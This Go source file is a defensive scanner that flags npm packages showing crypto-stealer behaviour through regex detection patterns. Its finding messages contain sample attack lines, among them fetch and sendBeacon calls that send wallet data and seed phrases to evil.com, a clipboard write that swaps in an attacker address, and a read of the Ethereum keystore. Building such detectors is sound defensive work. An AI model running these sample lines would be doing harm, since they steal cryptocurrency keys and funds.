package analyzer

import (
	"fmt"
	"regexp"
	"strings"
)

// CryptoTheftAnalyzer detects cryptocurrency-targeting malware patterns
// including wallet address harvesting, clipboard hijacking, private key
// theft, and seed phrase exfiltration.
// Based on Phylum/Sonatype research on npm crypto-stealer campaigns.
type CryptoTheftAnalyzer struct{}

func NewCryptoTheftAnalyzer() *CryptoTheftAnalyzer {
	return &CryptoTheftAnalyzer{}
}

func (a *CryptoTheftAnalyzer) Name() string {
	return "crypto-theft"
}

var (
	// Ethereum address pattern: 0x followed by 40 hex chars
	ethAddressPattern = regexp.MustCompile(`0x[a-fA-F0-9]{40}`)

	// Bitcoin address pattern (legacy P2PKH)
	btcAddressPattern = regexp.MustCompile(`[13][a-km-zA-HJ-NP-Z1-9]{25,34}`)

	// Clipboard access patterns
	clipboardPattern = regexp.MustCompile(`(?i)clipboard\s*\.\s*(?:read|write|writeText|readText)|navigator\.clipboard|clipboardy|copy-paste`)

	// Wallet file paths
	walletPathPattern = regexp.MustCompile(`(?i)\.ethereum|\.bitcoin|wallet\.dat|keystore|\.solana|\.metamask|\.phantom`)

	// Seed phrase / mnemonic related keywords
	seedPhrasePattern = regexp.MustCompile(`(?i)(?:seed|mnemonic|recovery)\s*(?:phrase|words?)|bip39|bip44|\.split\s*\(\s*['"] ['"]`)

	// Private key patterns
	privateKeyPattern = regexp.MustCompile(`(?i)private.?key|secret.?key|priv.?key|signing.?key`)
)

func (a *CryptoTheftAnalyzer) scanContent(content string, filename string) []Finding {
	var findings []Finding

	hasEthAddr := ethAddressPattern.MatchString(content)
	hasBtcAddr := btcAddressPattern.MatchString(content)
	hasClipboard := clipboardPattern.MatchString(content)
	hasWalletPath := walletPathPattern.MatchString(content)
	hasSeedPhrase := seedPhrasePattern.MatchString(content)
	hasPrivateKey := privateKeyPattern.MatchString(content)
	hasExfil := strings.Contains(content, "fetch(") ||
		strings.Contains(content, "sendBeacon") ||
		strings.Contains(content, "XMLHttpRequest") ||
		strings.Contains(content, "require('http")

	// Hardcoded wallet addresses (used as replacement targets)
	if hasEthAddr || hasBtcAddr {
		addrTypes := []string{}
		if hasEthAddr {
			addrTypes = append(addrTypes, "Ethereum")
		}
		if hasBtcAddr {
			addrTypes = append(addrTypes, "Bitcoin")
		}
		severity := SeverityMedium
		if hasClipboard || hasExfil {
			severity = SeverityCritical
		}
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       fmt.Sprintf("Cryptocurrency wallet addresses detected (%s)", strings.Join(addrTypes, ", ")),
			Description: fmt.Sprintf("File %q contains hardcoded %s wallet addresses. Combined with clipboard or network access, this indicates a crypto-stealer.", filename, strings.Join(addrTypes, "/")),
			Severity:    severity,
			ExploitExample: "Clipboard replacement attack:\n" +
				"    // Replace copied wallet address with attacker's\n" +
				"    clipboard.write('0xATTACKER_ADDRESS');\n" +
				"    User sends funds to attacker instead of intended recipient.",
			Remediation: "Investigate why an npm package contains hardcoded cryptocurrency addresses.",
		})
	}

	// Clipboard hijacking with crypto context
	if hasClipboard && (hasEthAddr || hasBtcAddr || strings.Contains(content, "0x[a-fA-F") || strings.Contains(content, "match(/")) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Clipboard hijacking for cryptocurrency theft",
			Description: fmt.Sprintf("File %q accesses the clipboard and contains cryptocurrency address patterns. This is a clipboard replacement attack that swaps wallet addresses.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Clipboard hijack flow:\n" +
				"    1. Monitor clipboard for crypto address patterns\n" +
				"    2. Replace with attacker-controlled address\n" +
				"    3. User pastes attacker's address into exchange/wallet",
			Remediation: "This is a crypto-clipper. The package should be removed immediately.",
		})
	}

	// Wallet file searching/exfiltration
	if hasWalletPath && (hasExfil || strings.Contains(content, "readFile") || strings.Contains(content, "readFileSync")) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Wallet file search and exfiltration",
			Description: fmt.Sprintf("File %q searches for cryptocurrency wallet files and reads/exfiltrates their contents.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Wallet theft:\n" +
				"    // Search common wallet locations\n" +
				"    fs.readFileSync(home + '/.ethereum/keystore');\n" +
				"    // Exfiltrate to attacker server\n" +
				"    fetch('https://evil.com', {body: walletData});",
			Remediation: "This is wallet-stealing malware. Remove the package and rotate all cryptocurrency keys.",
		})
	}

	// Seed phrase / mnemonic extraction
	if hasSeedPhrase && (hasExfil || strings.Contains(content, "addEventListener")) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Seed phrase/mnemonic capture detected",
			Description: fmt.Sprintf("File %q captures or processes seed phrases/mnemonics and may exfiltrate them. Seed phrases provide full wallet access.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Seed phrase theft:\n" +
				"    // Capture seed input from phishing page\n" +
				"    input.addEventListener('input', (e) => {\n" +
				"        sendBeacon('https://evil.com', e.target.value);\n" +
				"    });",
			Remediation: "This is seed phrase theft malware. Remove immediately. If seed phrases were entered, move funds to a new wallet.",
		})
	}

	// Private key extraction
	if hasPrivateKey && (hasExfil || strings.Contains(content, "readFile")) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Private key extraction attempt",
			Description: fmt.Sprintf("File %q searches for or processes private keys with exfiltration capability.", filename),
			Severity:    SeverityCritical,
			Remediation: "Investigate private key access patterns. Rotate any potentially compromised keys.",
		})
	}

	return findings
}
